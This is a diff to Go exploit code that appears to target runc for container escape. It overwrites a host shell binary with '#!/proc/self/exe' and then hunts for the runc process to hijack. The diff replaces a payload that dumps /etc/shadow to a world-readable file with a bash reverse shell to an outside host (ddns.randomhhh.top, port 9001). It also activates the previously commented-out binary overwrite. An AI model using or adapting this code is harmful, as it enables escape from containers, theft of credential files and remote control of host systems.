@@ -13,22 +13,22 @@ import (
 )
 
 // This is the line of shell commands that will execute on the host
-var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
+var payload = "#!/bin/bash \n bash -i >& /dev/tcp/ddns.randomhhh.top/9001 0>&1"
 
 func main() {
 	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
-	// fd, err := os.Create("/bin/sh")
-	// if err != nil {
+	fd, err := os.Create("/bin/dash")
+	if err != nil {
 		// fmt.Println(err)
 		// return
-	// }
-	// fmt.Fprintln(fd, "#!/proc/self/exe")
-	// err = fd.Close()
-	// if err != nil {
-		// fmt.Println(err)
-		// return
-	// }
-	// fmt.Println("[+] Overwritten /bin/sh successfully")
+	}
+	fmt.Fprintln(fd, "#!/proc/self/exe")
+	err = fd.Close()
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	fmt.Println("[+] Overwritten /bin/dash successfully")
 
 	// Loop through all processes to find one whose cmdline includes runcinit
 	// This will be the process created by runc
@@ -52,6 +52,7 @@ func main() {
 			}
 		}
 	}
+	fmt.Println("[+] Start to find file handle")
 
 	// We will use the pid to get a file handle for runc on the host.
 	var handleFd = -1
